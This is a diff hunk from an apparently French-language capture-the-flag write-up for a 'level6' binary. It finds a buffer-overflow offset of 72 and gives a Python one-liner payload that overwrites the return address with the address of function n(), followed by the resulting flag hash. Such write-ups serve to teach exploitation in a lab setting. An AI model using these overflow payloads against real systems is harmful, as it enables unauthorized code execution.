@@ -163,7 +163,7 @@ On cherche l'offset:
     - [Le générateur](https://wiremask.eu/tools/buffer-overflow-pattern-generator) nous indique qu'on atteint l'offset à 72
  
  On Lance ./level6 avec un payload avec 72 octets random, puis l'adresse de n() en little endian:
- - `./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')`
+- `./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')`
   ```
   f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
   ```
